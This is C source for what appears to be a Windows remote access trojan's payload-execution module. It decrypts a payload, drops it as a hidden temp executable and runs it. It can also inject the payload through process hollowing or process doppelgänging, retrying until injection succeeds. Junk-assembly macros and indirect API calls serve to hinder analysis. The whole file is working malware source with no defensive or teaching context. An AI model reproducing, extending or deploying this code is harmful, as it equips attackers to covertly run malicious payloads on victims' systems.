#include "global_config.h"
#include "process_hollow.h"
#include "crypto.h"
#include "kernel_driver_installer_invoker.h"

#include <stdio.h>
#include "Windows.h"
#include "junk_asm.h"
#include "functions_table.h"
#include "process_droppelganging.h"

#include "debug.h"


#pragma warning(disable:4996)

DWORD TOR_PROCESS_ID;

static char* drop_and_run_payload_exe(char payload[], int payload_len) {
	ASM_JUNK;

	char* tmp_file = (char*)calloc(300, 1);

	char tempfile_path[MAX_PATH];

	//
	int res = 0;


	res = l_GetTempPathA(MAX_PATH, tempfile_path);

	if (res > MAX_PATH || res == 0) {
		DBG_MSG("drop_and_run_exe() - GetTempPathA() failed.\n");
		return tmp_file;
	}


	//
	l_GetTempFileNameA(tempfile_path, NULL, 0, tmp_file);

	//
	char* exe = NULL;
	decrypt_to_string(&exe, EXE, EXE_LEN);

	DBG_MSG("drop_and_run_payload_exe() - exe: %s\n", exe);

	//
	strcat(tmp_file, exe);

	//
	free(exe);


	//
	bool w_res = write_file(tmp_file, payload, payload_len);


	if (!w_res) {
		DBG_MSG("drop_and_run_exe() - write_file() failed. file: \n", tmp_file);
		return tmp_file;
	}

	//
	l_SetFileAttributesA(tmp_file, FILE_ATTRIBUTE_HIDDEN);

	//
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));


	DBG_MSG("drop_and_run_exe() - Running the target executable, tmp_file: %s\n", tmp_file);

	//
	//if (!l_CreateProcessA(NULL, tmp_file, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
	if (!l_CreateProcessA(NULL, tmp_file, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi)) {
		DBG_MSG("drop_and_run_exe() - Error: Unable to run the target executable. CreateProcess failed with error %d\n", l_GetLastError());
		return tmp_file;
	}

	DBG_MSG("drop_and_run_exe() - Running the target executable, tmp_file: %s SUCCESS.\n", tmp_file);

	//
	TOR_PROCESS_ID = pi.dwProcessId;

	//


	return tmp_file;
}


char* execute_payload(char payload[], DWORD TOR_PAYLOAD_LEN, DWORD * tor_process_id) {
	ASM_JUNK;

	char* default_return = (char*)calloc(10, 1);
	int rat_execution_type = RAT_EXECUTION_TYPE;

	switch (rat_execution_type) {
	case 1:
	{
		return drop_and_run_payload_exe(payload, TOR_PAYLOAD_LEN);
	}
	break;

	case 2:
	{
		ph_init();

		// this function could fail, so re-try until it done.
		char* tor_hollow_target = (char*)calloc(TOR_HOLLOW_TARGET_ENCRYPTED_LEN + 1, 1);
		strncpy(tor_hollow_target,
			(char*)xor_encrypt_decrypt((char*)TOR_HOLLOW_TARGET, (char*)CONSTANT_ENCRYPTION_KEY, TOR_HOLLOW_TARGET_ENCRYPTED_LEN),
			TOR_HOLLOW_TARGET_ENCRYPTED_LEN);

		DBG_MSG("execute_payload() - tor_hollow_target: %s\n", tor_hollow_target);

		while (
			create_hollowed_proc(
				"",
				tor_hollow_target,
				payload,
				tor_process_id
			) == 1
			)

		{
			l_Sleep(rand() % 10000);
		}

		//
		free(tor_hollow_target);
		return default_return;
	}
	break;

	case 3:
	{
		char* tor_hollow_target = (char*)calloc(TOR_HOLLOW_TARGET_ENCRYPTED_LEN + 1, 1);
		strncpy(tor_hollow_target,
			(char*)xor_encrypt_decrypt((char*)TOR_HOLLOW_TARGET, (char*)CONSTANT_ENCRYPTION_KEY, TOR_HOLLOW_TARGET_ENCRYPTED_LEN),
			TOR_HOLLOW_TARGET_ENCRYPTED_LEN);

		DBG_MSG("execute_payload() - tor_hollow_target: %s\n", tor_hollow_target);

		bool ret = false;

		while (!ret) {
			ret = process_doppelganging(tor_hollow_target, (PVOID)payload, TOR_PAYLOAD_LEN);
			l_Sleep(3000);
		}
		
		//
		free(tor_hollow_target);
		return default_return;
	}
	break;

	default:
		DBG_MSG("execute_payload() - not recognized rat_execution_type: %d\n", rat_execution_type);
		break;
	}

	return default_return;
}